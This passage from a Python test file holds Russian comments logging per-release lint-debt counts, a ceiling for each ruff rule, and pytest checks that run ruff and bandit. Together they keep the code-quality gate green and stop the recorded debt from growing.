# условие доступа, а не как значение — пять «admin: User =
# Depends(require_admin)» в read-only маршрутах модерации (список компаний,
# карточка, очередь заявок, журнал, закрытые кабинеты) и один
# «company: B2bCompany = Depends(require_verified)» в гейте схемы.
# Итог 2 573 → 2 639 при сумме потолков 2 641: запас в две единицы даёт I001
# (потолок 187, факт 186) — сортировка импортов в файлах выпуска починила ещё
# один унаследованный блок. Долг своего кода выпуск починил, а не перенёс в
# реестр: отсортированы импорты (I001 — новый блок в app/main.py, все модули
# контура и тесты выпуска), убраны два неиспользуемых импорта в тестах (F401),
# три subprocess.run получили явный check=False (PLW1510), заглушки Checko и
# почты именуют аргументы с подчёркиванием, из гейта содержимого убран
# неиспользуемый «db». Переключатель b2b_require_registry
# получил реальное действие: раньше параметр принимался и ни на что не влиял,
# теперь он решает, блокирует ли красная карточка реестра автоматическое
# подтверждение статуса.
# v1.70.46: UP009 198 → 199 (один новый файл — tests/test_v17046.py; строка
# «# -*- coding: utf-8 -*-» в шапке обязательна по конвенции репозитория,
# поэтому рост технологический, а не долг качества). Фактический F401
# 123 → 122 при прежнем потолке: аудит удалил двенадцать мёртвых объектов, и
# вместе с двумя функциями в app/b2b/auth.py осиротели имена datetime и
# timezone в импорте — импорт сужен до timedelta. Запас по F401 вернулся к
# исторической единице (122 при потолке 123); потолок не занижен, потому что
# запас задокументирован выше словами «запас по F401 сохранён». Итог
# 2 639 → 2 640 при сумме потолков 2 642.
# v1.70.47: UP009 199 → 203 (четыре новых файла — три модуля юридического
# пакета app/legal/ и tests/test_v17047.py; строка «# -*- coding: utf-8 -*-»
# в шапке обязательна по конвенции репозитория, поэтому рост технологический,
# а не долг качества). B008 466 → 469: три маршрута страницы оферты
# (/oferta, /oferta.txt, /api/v1/legal/offerta) объявлены тем же
# идиоматичным для фреймворка способом Depends() в значении по умолчанию,
# что и все 460 с лишним существующих. Итог 2 640 → 2 647 при сумме потолков
# 2 649: запас в две единицы дают I001 (потолок 187, факт 186) и F401
# (потолок 123, факт 122). Своего долга выпуск не добавил: импорты в новых
# модулях отсортированы, неиспользуемых имён нет, а черновой помощник
# short_summary заменён рабочим short_terms раньше, чем стал мёртвым кодом.
DEBT = {
    "SIM115": 1101, "B008": 469, "ARG001": 267, "I001": 187, "UP009": 203,
    "F401": 123, "DTZ003": 111, "PLW1510": 82, "F841": 38, "S110": 32,
    "F811": 21, "BLE001": 13, "DTZ004": 2,
}


class TestLintDebtRatchet:
    """Ворота ruff должны оставаться зелёными, а реестр долга — не расти."""

    @pytest.fixture(scope="class")
    def ruff(self):
        exe = shutil.which("ruff") or str(ROOT / ".venv" / "bin" / "ruff")
        if not Path(exe).exists():
            pytest.skip("ruff не установлен (pip install -r requirements-dev.txt)")
        return exe

    def test_gate_is_green(self, ruff):
        code = subprocess.run([ruff, "check", "app", "tests", "--no-cache",
                               "--select", GATE],
                              capture_output=True, text=True, cwd=ROOT,
                              check=False)
        assert code.returncode == 0, code.stdout[-1500:]

    def test_debt_does_not_grow(self, ruff):
        code = subprocess.run([ruff, "check", "app", "tests", "--no-cache",
                               "--select", ",".join(DEBT), "--statistics"],
                              capture_output=True, text=True, cwd=ROOT,
                              check=False)
        got = {}
        for line in code.stdout.splitlines():
            m = re.match(r"\s*(\d+)\s+(\w[\w\d]*)\s+", line)
            if m:
                got[m.group(2)] = int(m.group(1))
        grown = {rule: (got.get(rule, 0), limit)
                 for rule, limit in DEBT.items() if got.get(rule, 0) > limit}
        assert not grown, f"долг вырос: {grown}"

    def test_bandit_has_no_high_or_medium(self):
        exe = shutil.which("bandit") or str(ROOT / ".venv" / "bin" / "bandit")
        if not Path(exe).exists():
            pytest.skip("bandit не установлен")
        code = subprocess.run([exe, "-r", "app", "-x", "app/vendor", "-q",
                               "--msg-template", "{severity}|{test_id}|{relpath}|{line}"],
                              capture_output=True, text=True, cwd=ROOT, check=False)
        out = code.stdout + code.stderr
        bad = [line for line in out.splitlines()
               if line.startswith(("HIGH|", "MEDIUM|"))]
        assert not bad, bad[:10]
